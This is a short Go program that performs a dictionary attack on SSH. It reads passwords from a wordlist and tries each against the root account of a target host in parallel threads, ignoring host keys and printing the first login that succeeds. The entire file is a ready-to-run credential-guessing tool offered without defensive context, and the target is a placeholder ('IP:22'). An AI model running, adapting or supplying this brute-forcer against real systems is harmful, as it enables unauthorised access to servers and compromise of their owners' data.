package main

import (
	"bufio"
	"fmt"
	"os"

	"golang.org/x/crypto/ssh"
)

func testSSHAUTH(ip, username, password string, doneChannel chan bool) {
	sshConfig := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	_, err := ssh.Dial("tcp", ip, sshConfig)
	if err != nil {
		fmt.Println("SSH connect error:", err)
	} else {
		fmt.Println("SSH connect success:", username, password)
		os.Exit(0)
	}
	doneChannel <- true
}

func main() {
	ip := "IP:22"
	username := "root"
	passwordfile, err := os.Open("wordlist")
	if err != nil {
		fmt.Println("Password file open error:", err)
	}
	scanner := bufio.NewScanner(passwordfile)

	doneChannel := make(chan bool)
	actThreads := 0
	maxThreads := 10
	for scanner.Scan() {
		actThreads++

		password := scanner.Text()
		go testSSHAUTH(ip, username, password, doneChannel)

		if actThreads >= maxThreads {
			<-doneChannel
			actThreads--
		}
	}
	for actThreads > 0 {
		<-doneChannel
		actThreads--

	}

}
